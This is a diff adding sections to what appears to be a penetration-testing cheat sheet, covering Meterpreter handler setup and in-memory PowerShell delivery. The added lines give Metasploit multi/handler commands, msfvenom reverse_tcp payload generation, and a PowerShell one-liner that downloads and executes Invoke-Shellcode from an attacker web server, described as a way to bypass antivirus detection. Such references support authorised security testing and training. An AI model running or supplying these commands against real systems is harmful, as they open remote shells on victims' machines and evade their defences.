@@ -239,6 +239,59 @@ It communicates over the stager socket and provides a comprehensive
 client-side Ruby API.   
 It features command history, tab completion, channels, and more.
 
+###### Handler
+
+When using a meterpreter payload, a handler must be started on the host machine.
+
+The commands to start a metasploit handler are as follows:
+
+```bash
+# msfconsole -q
+
+msf> use exploit multi/handler
+
+# Set the payload being executed on the target
+msf> set payload windows/x64/meterpreter/reverse_tcp
+
+# Set the local IP and port. In case of a NATED VM with port
+# forwarding/redirection, the IP 0.0.0.0 can be used  
+msf> set LHOST <HOST_IP>
+msf> set LPORT <HOST_PORT>
+
+# To be able to keep several sessions at a time on a single multi/handler
+msf> set ExitOnSession false
+msf> exploit -j
+```
+
+###### Meterpreter over PowerShell
+
+The msfvenom and Invoke-Shellcode tools can be used to leverage a meterpreter
+on the target through powershell and in memory execution. This can be used to
+bypass AV detection.
+
+The commands to generate a payload, download and execute it on the target are
+as follows:
+
+```bash
+# x86 target
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1
+
+# x64 target
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1
+
+# Then replace the payload in the Invoke-Shellcode script with the generated payload
+# Copy everything from 0xfc to 0xd5 into the $Shellcode32 or $Shellcode64 variables
+
+# Setup a web server hosting the modified Invoke-Shellcode script and a metasploit handler with the according payload
+# python -m SimpleHTTPServer <HOST_PORT>
+# msf > use multi/handler ...
+
+# Then download in memory and execute the reverse meterpreter
+powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
+```
+
+
+
 ###### Unicorn w/ PowerShell
 
 Magic Unicorn is a tool for using a PowerShell downgrade attack and inject
